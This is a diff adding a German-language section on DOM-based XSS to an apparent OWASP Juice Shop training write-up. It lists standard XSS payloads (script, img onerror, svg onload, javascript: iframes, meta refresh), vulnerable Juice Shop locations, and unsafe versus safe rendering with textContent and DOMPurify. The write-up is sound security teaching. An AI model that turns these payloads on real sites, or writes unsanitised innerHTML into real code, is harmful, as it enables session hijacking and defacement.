@@ -556,6 +556,200 @@ function analyzeUnicodeBypass() {
 
 ---
 
+## 6. DOM XSS - Cross-Site Scripting Angriffe
+
+### 📝 Beschreibung
+DOM-basierte XSS-Schwachstellen entstehen, wenn JavaScript unsichere Benutzereingaben direkt in das DOM schreibt. Die Juice Shop ist anfällig für verschiedene XSS-Payloads.
+
+### 🔍 Methode 1: Klassischer iframe XSS
+
+```javascript
+// Einfacher iframe-basierter XSS Payload
+<iframe src="javascript:alert(`xss`)">
+```
+
+### 📝 Wie funktioniert's?
+
+1. **Eingabefeld finden**: Suche nach Feldern, die HTML akzeptieren (z.B. Suchfeld, Kommentare)
+2. **Payload einfügen**: Gib den iframe-Code ein
+3. **Ausführung**: Der Browser führt das JavaScript im iframe aus
+
+### 🛠️ Technische Erklärung
+
+```javascript
+// Was passiert im Hintergrund:
+// 1. Unsichere DOM-Manipulation
+element.innerHTML = userInput; // GEFÄHRLICH!
+
+// 2. Der iframe wird gerendert
+// <iframe src="javascript:alert(`xss`)">
+
+// 3. JavaScript im src-Attribut wird ausgeführt
+// javascript: Protocol Handler löst Code-Ausführung aus
+```
+
+### 🔍 Methode 2: Bonus Payload - SoundCloud iframe
+
+```html
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" 
+        src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
+</iframe>
+```
+
+### 🎯 Warum funktioniert dieser Payload?
+
+1. **Legitimer Content**: SoundCloud-Player sieht harmlos aus
+2. **Autoplay**: Musik startet automatisch = Beweis für XSS
+3. **Visuelle Bestätigung**: Großer, sichtbarer iframe
+4. **Social Engineering**: Benutzer denken es ist gewollter Content
+
+### 🔍 Exploit-Analyse
+
+```javascript
+// Schritt-für-Schritt Analyse des Bonus Payloads
+function analyzePayload() {
+    const payload = {
+        // iframe Attribute
+        width: "100%",           // Volle Breite
+        height: "166",           // Standard SoundCloud Höhe
+        scrolling: "no",         // Kein Scrolling
+        frameborder: "no",       // Kein Rahmen
+        allow: "autoplay",       // Autoplay erlaubt
+        
+        // SoundCloud API Parameter
+        src: {
+            baseUrl: "https://w.soundcloud.com/player/",
+            params: {
+                url: "https://api.soundcloud.com/tracks/771984076",
+                color: "#ff5500",     // Orange
+                auto_play: true,      // WICHTIG: Automatisches Abspielen
+                hide_related: false,
+                show_comments: true,
+                show_user: true,
+                show_reposts: false,
+                show_teaser: true
+            }
+        }
+    };
+    
+    console.log('🎵 SoundCloud XSS Payload:', payload);
+    return payload;
+}
+```
+
+### 💡 Verschiedene XSS-Vektoren testen
+
+```javascript
+// Sammlung von XSS Payloads für Juice Shop
+const xssPayloads = [
+    // 1. Classic Alert
+    `<script>alert('XSS')</script>`,
+    
+    // 2. IMG Tag
+    `<img src=x onerror="alert('XSS')">`,
+    
+    // 3. SVG
+    `<svg onload="alert('XSS')">`,
+    
+    // 4. iframe JavaScript
+    `<iframe src="javascript:alert('XSS')">`,
+    
+    // 5. Event Handler
+    `<body onload="alert('XSS')">`,
+    
+    // 6. Data URI
+    `<object data="data:text/html,<script>alert('XSS')</script>">`,
+    
+    // 7. Style Tag
+    `<style>@import'javascript:alert("XSS")';</style>`,
+    
+    // 8. Meta Refresh
+    `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`,
+    
+    // 9. SoundCloud Bonus
+    `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`
+];
+
+// Test-Funktion
+function testXSS() {
+    console.log('🧪 XSS Payloads zum Testen:');
+    xssPayloads.forEach((payload, index) => {
+        console.log(`${index + 1}. ${payload.substring(0, 50)}...`);
+    });
+}
+```
+
+### 🚨 DOM XSS Locations in Juice Shop
+
+```javascript
+// Typische verwundbare Stellen
+const vulnerableLocations = [
+    {
+        location: "Search Box",
+        url: "/#/search?q=PAYLOAD",
+        method: "GET Parameter"
+    },
+    {
+        location: "Product Reviews",
+        url: "/#/product/*/reviews",
+        method: "POST Body"
+    },
+    {
+        location: "Contact Form",
+        url: "/#/contact",
+        method: "Form Input"
+    },
+    {
+        location: "User Profile",
+        url: "/#/profile",
+        method: "Profile Fields"
+    }
+];
+
+console.log('📍 Verwundbare Locations:', vulnerableLocations);
+```
+
+### 🛡️ Sicherheitslücke verstehen
+
+```javascript
+// UNSICHER - So macht es Juice Shop
+function unsafeRender(userInput) {
+    // Direkte DOM-Manipulation ohne Sanitization
+    document.getElementById('output').innerHTML = userInput; // ❌ GEFÄHRLICH!
+}
+
+// SICHER - So sollte es sein
+function safeRender(userInput) {
+    // Option 1: textContent verwenden
+    document.getElementById('output').textContent = userInput; // ✅ SICHER
+    
+    // Option 2: Input sanitizen
+    const sanitized = DOMPurify.sanitize(userInput); // ✅ Mit DOMPurify
+    document.getElementById('output').innerHTML = sanitized;
+    
+    // Option 3: Content Security Policy
+    // Header: Content-Security-Policy: script-src 'self'
+}
+```
+
+### 💡 Warum funktionieren diese XSS-Angriffe?
+
+1. **Fehlende Input-Validierung**: Keine Filterung von HTML/JavaScript
+2. **Unsichere DOM-Manipulation**: `innerHTML` statt `textContent`
+3. **Keine Content Security Policy**: Inline-Scripts erlaubt
+4. **Framework-Schwächen**: Angular-Sanitization umgangen
+5. **Vertrauen in User-Input**: Keine Server-seitige Validierung
+
+### 🎯 Impact der XSS-Schwachstelle
+
+- **Session Hijacking**: Token/Cookie Diebstahl möglich
+- **Phishing**: Fake-Login Forms einfügen
+- **Defacement**: Seiteninhalte verändern
+- **Malware Distribution**: Bösartige Scripts laden
+- **Keylogging**: Tastatureingaben aufzeichnen
+
+---
+
 ## 📚 Zusammenfassung der Schwachstellen
 
 1. **SQL Injection**: Fehlende Input-Validierung
@@ -563,6 +757,7 @@ function analyzeUnicodeBypass() {
 3. **Information Disclosure**: Exposed Routes in JavaScript
 4. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
 5. **File Upload**: Unzureichende Dateivalidierung
+6. **DOM XSS**: Unsichere DOM-Manipulation und fehlende Sanitization
 
 ## 🛡️ Empfohlene Gegenmaßnahmen
 
@@ -571,4 +766,5 @@ function analyzeUnicodeBypass() {
 3. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
 4. **File Validation**: MIME-Type und Magic Bytes prüfen
 5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
+6. **XSS Prevention**: Input-Sanitization, textContent statt innerHTML, DOMPurify
 
